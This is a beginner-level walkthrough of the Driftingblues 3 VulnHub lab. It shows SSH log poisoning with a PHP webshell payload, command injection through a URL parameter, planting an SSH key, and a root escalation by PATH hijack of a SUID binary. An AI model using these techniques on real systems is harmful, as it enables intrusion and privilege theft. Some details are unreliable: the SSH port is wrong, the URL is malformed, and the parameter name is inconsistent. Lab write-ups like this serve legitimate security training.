Driftingblues 3 Vulnhub Walkthrough

Level : Beginner / Intermediate

Goal: Find user flag and root flag

Summary

This is a writeup for the Vulnhub Machine - Driftingblues:3 which was released by tasiyanci

Machine Discovery

First we will use nmap -sn 192.168.1.0/24 to discover the machine in your network. (I have assigned an IP of 192.168.1.0/24 range to my machine)

Port Scanning

Once the machine is discovered, we will do a port scan using nmap

nmap -A -T4 -p- 192.168.1.5

Exploiting User Flag

We can see that SSH(Port 20) and HTTP(Port 80) are open. We can see that there is a disallowed entry in robots.txt of /eventadmins
We will start by first checking the website

No clue here. We will check the /eventadmins page which was disallowed.

We can see /littlequeenofspades.html page, so lets check it out.
After opening the page, you will see a poem. Then View Source code (CTRL+u) of the page

In the last line, you will see an encoded string. This is a double base64 encoded string so we will decode it.
Use echo ‘string’ | base64 -d

Decode the encoded part again

We got a /adminsfixit.php page. Lets check it out
You will see a SSH log page. Go to View Source Code and you will see all the logs generated on the SSH

If you login on SSH, you will see that the log gets generated here. For instance we will try ssh john@192.168.1.5

As you can see, there is an entry for John in the ssh log. We do not need actual credentials, we just need to check if we can execute commands on the server
Now since logs are generating, we can get a reverse shell. But for that we need to start cmd webshell on the target
We will use PHP command to get a webshell

ssh '<?php system($_GET[“CMD”]); ?>’@192.168.1.5

Now we can use cmd in the URL for code injection. We can start by checking the id

http:192.168.1.5/adminsfixit.php?cmd=id

As you can see, we are able to see the id command executed.
Now can go for a netcat reverse shell.
On terminal we will start the listener and on Browser, we will execute the reverse shell

And we got our shell
We will use python command to get a bash shell

Now we will go to /home directory and we can see that there is a user called robertj. Now cd into robertj
We can see user flag user.txt but we do not have permission to access it.

We need to login as robertj to access the flag
If you have observed, we do not need password for SSH login. We need to login with the key
We can create our own Public and Private key which will be stored in the /.ssh directory in robertj
We will use ssh-keygen -t rsa command for this.
We will enter the path to save the key as /home/robertj/.ssh/rsa_key

We need to save the public key (rsa_key.pub) to authorized_keys file which is used by SSH to verify login.

Use cat to check the public key (rsa_key.pub) and private key (rsa_key) and then copy the private key to your attack machine and save it into a text file.

I used nano to save the key to a file called priv_key and use chmod 600
Now login to ssh with user robertj and key as priv_key

ssh robertj@192.168.1.5 -i priv_key

After login, you can now open the user flag user.txt

Exploiting Root Flag

For escalating privileges, we can try by finding sudo permissions for user robertj.

find / -type f -perm -4000 -exec ls -l {} ; 2>/dev/null

There is a command /usr/bin/getinfo which appears vulnerable
If you run the command /usr/bin/getinfo you get the information like IP, hostname and os info

If you cat /usr/bin/getinfo, you can see the commands which are showing us this info like ip a, cat /etc/hosts, uname -a
If we can modify any of these commands to open bash, we can get root shell
Go to the /tmp directory and create a file uname and let the uname execute /bin/bash command

echo ‘/bin/bash’ > uname

Make it executable with chmod 777 uname
We will use the bash environment variable concept to set /tmp directory to PATH variable

export PATH=/tmp/:$PATH

Now run the /usr/bin/getinfo and then you will get the root shell
Go to /root directory and you will get the root flag root.txt
